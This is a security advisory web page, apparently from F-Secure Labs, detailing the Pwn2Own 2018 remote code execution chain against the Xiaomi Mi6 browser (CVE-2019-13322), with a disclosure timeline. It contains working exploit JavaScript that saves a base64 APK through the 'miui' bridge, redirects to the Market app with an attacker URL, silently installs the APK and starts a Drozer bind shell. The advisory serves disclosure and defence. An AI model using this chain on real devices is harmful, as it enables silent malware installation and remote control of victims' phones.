<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Xiaomi Mi6 Browser Remote Code Execution (Pwn2Own 2018)</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/xiaomi/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/xiaomi/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/xiaomi/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Xiaomi Mi6 Browser Remote Code Execution (Pwn2Own 2018)</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Xiaomi Mi6</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2019-13322</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>Remote Code Execution</td>
          </tr>
        </table>
        
        <h1>Introduction</h1><p>At Pwn2own in 2018, F-Secure Labs demonstrated compromise of the Xiaomi Mi6 when it connected to a web page under control by an attacker. At a high level, the following steps were followed:</p><ol><li>User selects a link from a web page, SMS message, or email which loads attacker’s web site on the Xiaomi browser application</li>
<li>Web page auto downloads an HTML file using a JavaScript bridge</li>
<li>The Market app is then loaded using a browsable intent</li>
<li>The Market app loads a WebView with the URL provided in the intent, loading another of the attacker’s web pages</li>
<li>The web page uses another JavaScript bridge function to install the apk that was downloaded</li>
</ol><p>The app is automatically started by using an intent proxy.</p><h1>Technical Details</h1><h3>Initial Web Page – download file and trigger Market app</h3><p>The first step requires the victim to visit our website and must be accomplished by clicking on a link leading to the attacker's page. The initial web page performs two actions.</p><p>Firstly, it performs an automatic download of an HTML file. Automatic downloads through the use of anchor elements with the download attribute is not permitted in the Xiaomi browser. Instead, it is possible to use a JavaScript bridge that is included in all web pages, labelled “miui”.</p><p>This bridge includes a function named “share” that will store base64 encoded data to disk using a file name based on attributes supplied as arguments to the share function. An apk file can therefore be saved to disk using this method.</p><pre>@JavascriptInterface public void share(String arg8, String arg9, String arg10, String arg11, String arg12) {<br> OutputStream v1_1;<br> FileOutputStream v1;<br> OutputStream v2;<br> File v6;<br> byte[] v5;<br> …<br> int v0 = "base64,".length() + arg11.indexOf("base64,");<br> try {<br> v5 = Base64.decode(arg11.substring(v0), 0);<br> String v0_2 = arg8 != null || arg9 != null ? "share_" + arg8 + arg9 + arg10.hashCode() + ".jpg" : "jsShare.jpg";<br> v6 = new File(com.android.browser.j.a.a(this.a), v0_2);<br> v2 = null;</pre><p>This method can be accessed with the follow JavaScript that includes the apk to be installed as a base64 encoded string:</p><pre>miui.share("foo","foo","foo","base64," + apkFile);</pre><p>In this instance, the apk data will be saved to the file “/sdcard/Android/data/com.android.browser/cache/share/share_-1038556538.jpg”</p><p>After the file has successfully been downloaded, a link is accessed on the web page that redirects to the Market app (com.xiaomi.market). This can be achieved by creating an iframe with the src attribute set to be the browsable URL:</p><pre>var iFrame = document.createElement("iframe");<br> var marketRedirUrl = "http://testxiaomi.com/XiaomiPoC/market.html";<br> iFrame.src = "mimarket://browse?url=" + encodeURIComponent(marketRedirUrl);<br> document.body.appendChild(iFrame);</pre><p>This loads the Market app’s JoinActivity activity. This uses the “url” parameter provided as a URL for a WebView. By setting the “url” parameter to an attacker controlled web site, the attacker can therefore load arbitrary HTML into the WebView.</p><h3>Triggering of the install via the Market app</h3><p>The WebView in the Market app contains a JavaScript bridge named “market”. This includes a function that silently installs the drozer apk using a file on the local filesystem. The following JavaScript triggers the app install of the file downloaded in the previous step:</p><pre>function installAPK(){<br> market.install('{"appInfo":{"id":"test", "packageName":"com.xiaomi.test", "appId":"com.xiaomi.test"}, "callBack":"test", "needArrange":true, "ref":"test", "refPosition":1234, "apkPath":"/sdcard/Android/data/com.android.browser/cache/share/share_-1038556538.jpg"}');<br>}</pre><p>This calls the “install” method which parses the provided JSON and starts the “AppArrangeService” service, which proceeds to silently install the apk.</p><h3>Automatic starting of the app</h3><p>At the end of this process, once the installation is completed, a callback to JavaScript is performed by the app. This attempts to call the JavaScript function named in the “callBack” parameter in the install function call. This can be used to trigger the automatic starting of the installed app.</p><p>The test JavaScript function is defined as follows:</p><pre>function test(){<br> document.location='intent://dzprovider/1#Intent;scheme=content;end';<br>}</pre><p>Content schemes in this format are handled by the Browser app:</p><pre class="Code"> &lt;activity android:name="com.android.browser.BrowserActivity"&gt; <br>&lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.VIEW" /&gt;
        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
        &lt;category android:name="android.intent.category.DEFAULT" /&gt;
        &lt;data android:scheme="http" /&gt;
        &lt;data android:scheme="https" /&gt;
        &lt;data android:scheme="file" /&gt;
        &lt;data android:scheme="content" /&gt;
        &lt;data android:scheme="inline" /&gt;
        &lt;data android:mimeType="text/html" /&gt;
…
      &lt;/intent-filter&gt;
</pre><p><span> The “dzprovider” is a content provider included in the Drozer app:</span></p><pre>&lt;provider<br> android:name=".views.MyContentProvider"<br> android:authorities="dzprovider"<br> android:enabled="true"<br> android:exported="true"&gt;<br> &lt;/provider&gt;</pre><p><span>On attempting to load this content URL, the Browser app must determine what the mimetype is. This is achieved by calling the “getType(Uri uri)” method of the relevant content provider. By overwriting this method in the Drozer app, it is possible to gain code execution, which is then used to start the Drozer bind shell:</span></p><pre>@Override<br> public String getType(Uri uri) {<br> Intent i = new Intent();<br> i.addCategory("com.mwr.dz.START_EMBEDDED");<br> i.setComponent(new ComponentName("com.mwr.dz","com.mwr.dz.services.ServerService"));<br> Context c = getContext();<br> c.startService(i);<br> return “foo”;<br> }</pre><p> </p><h1>Detailed Timeline</h1><table><tbody><tr><td>Date</td>
<td>Summary</td>
</tr><tr><td><span>2018-11-14</span></td>
<td>Issue reported to ZDI at Pwn2Own</td>
</tr><tr><td>2019-01-27</td>
<td>ZDI contacted vendor requesting a status update</td>
</tr><tr><td>2019-02-06</td>
<td>ZDI contacted vendor again requesting a status update</td>
</tr><tr><td>2019-02-06</td>
<td><span>Vendor replied stating they plan to publish an update by the end of February</span></td>
</tr><tr><td>2019-02-14</td>
<td><span>ZDI notified the vendor the case would be 0-dayed if a fix was not available by the end of February</span></td>
</tr><tr><td>2019-03-04</td>
<td><span> Vendor replied but did not provide ETA</span></td>
</tr><tr><td>2019-06-03</td>
<td><span><span>ZDI notified the vendor the intention to 0-day the reports</span></span></td>
</tr><tr><td>2019-11-22</td>
<td><span><span>F-Secure release advisory</span></span></td>
</tr></tbody></table>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/xiaomi/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/xiaomi/&text=Xiaomi Mi6 Browser Remote Code Execution (Pwn2Own 2018)" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/xiaomi/&title=Xiaomi Mi6 Browser Remote Code Execution (Pwn2Own 2018)" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/xiaomi/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
